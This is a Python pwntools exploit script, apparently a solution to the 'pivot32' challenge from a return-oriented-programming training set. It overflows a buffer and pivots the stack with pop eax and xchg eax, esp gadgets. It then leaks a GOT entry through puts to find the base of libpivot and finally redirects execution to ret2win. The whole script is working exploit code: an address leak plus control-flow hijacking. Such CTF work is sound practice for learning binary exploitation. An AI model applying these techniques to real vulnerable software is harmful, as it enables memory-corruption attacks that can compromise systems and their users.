#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import re

exe = context.binary = ELF('./pivot32')
libpivot = ELF("./libpivot32.so")

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start(env={"LD_PRELOAD": "./libpivot32.so"})
data = io.recvuntil("> ")

stack_pivot = int(re.search(b"pivot: (0x[0-9a-f]+)\n", data).group(1), 16)


payload = (
    p32(exe.plt["foothold_function"]) +
    p32(exe.plt["puts"]) +
    p32(exe.functions["main"].address) +
    p32(exe.got["foothold_function"])
)
io.sendline(payload)

io.recvuntil("> ")
payload = (
    b"A" * 44 +
    p32(0x080488c0) + # : pop eax ; ret
    p32(stack_pivot) +
    p32(0x080488c2) # : xchg eax, esp ; ret
)
io.sendline(payload)
io.recvuntil("into libpivot.so")

data = io.recvline()

leak = u32(data[:4])
libpivot.address = leak - libpivot.sym.foothold_function

log.info("Leak: 0x%x", leak)
log.info("Libpivot: 0x%x", libpivot.address)

io.recvuntil("> ")
io.sendline(b"CCCC")

io.recvuntil("> ")
payload = (
    b"A" * 44 +
    p32(libpivot.sym.ret2win)
)
io.sendline(payload)


io.interactive()

